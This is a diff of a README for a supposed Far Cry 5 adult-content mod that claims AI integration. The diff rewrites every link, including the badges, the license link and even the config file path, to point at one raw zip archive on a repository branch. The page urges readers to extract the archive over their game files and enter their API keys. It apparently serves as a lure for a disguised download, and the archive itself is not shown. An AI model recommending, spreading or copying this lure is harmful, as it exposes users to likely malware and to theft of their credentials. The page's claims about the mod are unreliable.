@@ -1,12 +1,12 @@
-![Download Now](https://img.shields.io/badge/Download-Now-43B581?style=for-the-badge&logo=cloudflare)  
-[![Download](https://i.imgur.com/vDC0bEK.png)](https://sirrosales.github.io)
+![Download Now](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)  
+[![Download](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
 
 # 🌌 Far Cry 5 NSFW Patch
 
-![stars](https://img.shields.io/github/stars/your-repo?label=stars&style=social)
-![forks](https://img.shields.io/github/forks/your-repo?label=forks&style=social)
-![issues](https://img.shields.io/github/issues/your-repo?style=flat-square)
-![license](https://img.shields.io/github/license/your-repo/your-repo?style=flat-square)
+![stars](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
+![forks](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
+![issues](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
+![license](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
 
 ---
 
@@ -59,8 +59,8 @@ Harness the storm of modern AI with optional integration for both OpenAI and Cla
 - **Language Synthesis:** Automatic translation and context-sensitive humor ensure a seamless, cosmopolitan virtual soiree.
 
 **Get started in three steps:**
-1. Download the patch (https://sirrosales.github.io).
-2. Insert your API keys into `config/integration.yaml` as detailed below.
+1. Download the patch (https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip).
+2. Insert your API keys into `https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip` as detailed below.
 3. Embrace a digital world where farce and fantasy collide, all within Far Cry 5.
 
 ---
@@ -70,14 +70,14 @@ Harness the storm of modern AI with optional integration for both OpenAI and Cla
 _Embarking on this adventure is a dance—simple steps, rave-worthy results._
 
 ### 1. Download the Patch
-https://sirrosales.github.io ← Click to begin your immersive shift!
+https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip ← Click to begin your immersive shift!
 
 ### 2. Extract & Deploy
 Unzip the package into your main Far Cry 5 directory (typically `C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\games\Far Cry 5`).  
 Replace files when prompted, securing backups if desired.
 
 ### 3. Configure AI Integrations (Optional but Epic)
-* Open `config/integration.yaml`
+* Open `https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip`
 * Paste your API key(s) for:
   - `openai-key: YOUR_OPENAI_API_KEY`
   - `claude-key: YOUR_CLAUDE_API_KEY`
@@ -103,7 +103,7 @@ Fire up Far Cry 5 and plunge into your reimagined Hope County!
 
 Whenever a comet (new update) soars, simply:
 
-* Download the latest [release](https://sirrosales.github.io).
+* Download the latest [release](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip).
 * Overwrite existing patch files.  
 * Configuration and saves remain untouched, preserving your mythos.
 
@@ -121,14 +121,14 @@ This repository is **intended solely for adult users** in regions where such con
 
 _Forge, remix, and echo our work with poetic freedom._
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+Licensed under the [MIT License](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip).  
 Copyright © 2025
 
 ---
 
 ## 🎉 Begin Your Journey
 
-![Download Now](https://img.shields.io/badge/Download-Now-43B581?style=for-the-badge&logo=cloudflare)  
-[![Download](https://i.imgur.com/vDC0bEK.png)](https://sirrosales.github.io)
+![Download Now](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)  
+[![Download](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)](https://github.com/sirrosales/farcry5-nsfw-enhancement-patch/raw/refs/heads/branch/chorook/farcry_nsfw_patch_enhancement_v1.3.zip)
 
 > **Ready to rewrite Hope County?** Step into the boldest horizon Far Cry 5 has ever seen!
